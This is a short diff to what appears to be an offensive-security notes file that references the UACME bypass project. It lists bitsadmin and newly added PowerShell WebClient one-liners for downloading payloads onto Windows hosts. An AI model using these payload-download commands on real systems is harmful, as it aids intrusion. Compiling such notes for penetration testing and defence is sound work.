@@ -97,4 +97,8 @@ https://github.com/hfiref0x/UACME
 - bitsadmin.exe
   - Description: Allows you to download a payload.
   - Example: bitsadmin /transfer [job-name] /download /priority normal [URL-to-payload] [output-path]
-
+  
+- powershell.exe
+  - Description: Allows you to download a payload.
+  - Example: powershell -c "(New-Object System.Net.WebClient).DownloadString('https://google.com')"
+  
